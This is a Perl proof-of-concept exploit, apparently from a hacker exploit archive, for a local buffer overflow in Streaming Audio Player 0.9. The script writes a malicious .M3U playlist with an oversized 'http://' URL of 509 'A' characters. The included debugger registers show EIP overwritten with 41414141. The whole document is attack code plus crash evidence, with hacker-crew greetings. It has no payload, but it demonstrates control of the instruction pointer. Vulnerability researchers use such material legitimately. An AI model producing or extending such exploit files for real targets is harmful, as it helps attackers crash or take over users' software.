#!/usr/bin/perl
#
#
# Found By : Cyber-Zone (ABDELKHALEK)
#
#
# Thanx To All Friends : Hussin X , Jiko , Stack , ZoRLu , ThE g0bL!N , r1z , Mag!c ompo , SimO-s0fT ... All MoroCCaN HaCkerS
#
# FIGUIG OwnZ !!!
#
# Streaming Audio Player 0.9  (.M3U File) Local Buffer Overflow PoC
#
#Olly Registers
#EAX 00197D20
#ECX 0000020E
#EDX 00126F84
#EBX 00193DAF
#ESP 001270B8
#EBP 7C81391C kernel32.GetFullPathNameA
#ESI 00197D20
#EDI 001272D0 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
#EIP 41414141
#
my $Header = "#EXTM3U\n";
my $ex="http://"."A" x 509;
open(MYFILE,'>>buffer.m3u');
print MYFILE $Header.$ex;
close(MYFILE);
